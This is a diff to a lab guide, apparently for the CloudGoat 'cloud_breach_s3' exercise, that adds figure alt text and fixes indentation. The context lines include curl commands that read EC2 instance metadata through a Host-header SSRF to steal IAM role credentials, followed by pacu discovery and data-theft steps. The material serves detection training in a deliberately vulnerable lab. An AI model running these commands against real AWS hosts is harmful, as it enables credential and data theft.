@@ -18,6 +18,7 @@ Enumeration - AWS Suspicious Credential Usage - AWS Suspicious EC2
 Enumeration - AWS S3 Enumeration
 
 .. figure:: ./images/critical.png
+   :alt: critical
 
 Lab Notes
 #########
@@ -160,6 +161,7 @@ Setup AWS Profile
        aws sts get-caller-identity
 
    .. figure:: ./images/awsprofile.png
+      :alt: awsprofile
    
 Setup Cloudgoat
 ###############
@@ -175,9 +177,9 @@ Setup Cloudgoat
 
 - Run Cloudgoat config whitlelist
    
-   .. code:: bash
+  .. code:: bash
 
-      ~/cloudgoat/cloudgoat.py config whitelist --auto
+    ~/cloudgoat/cloudgoat.py config whitelist --auto
 
 Create vulnerable infrastructure
 ################################
@@ -193,6 +195,7 @@ Create vulnerable infrastructure
       ~/cloudgoat/cloudgoat.py create cloud_breach_s3
 
 .. figure:: ./images/cloudgoatout.png
+   :alt: cgsetup
 
 -  **Copy the response to a text file** you will need the EC2 IP
 
@@ -219,6 +222,7 @@ Steal Role
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
 
 .. figure:: ./images/role.png
+   :alt: role
 
 
 Steal Crendentials
@@ -233,6 +237,7 @@ Steal Crendentials
    curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'
 
 .. figure:: ./images/ssrf2.png
+   :alt: creds
 
 
 Discovery 
@@ -246,6 +251,7 @@ Discovery
       stolen credentials from the previous step
 
 .. figure:: ./images/pacukeys.png
+   :alt: keys
 
 Findings
 ********
@@ -267,8 +273,8 @@ Findings
 
    -  Exit pacu by typing ``exit`` and return to attack
    
-   Steal Data
-   **********
+Steal Data
+**********
 
 -  Create a new aws profile with stolen credentials
 
@@ -322,6 +328,7 @@ Findings
 -  Remove vulnerable infrasturecure
 
    .. code:: bash 
+   
       ~/cloudgoat/cloudgoat.py destroy cloud_breach_s3
 
 -  Attack had been completed. Review the detections in dfaws dashboard.
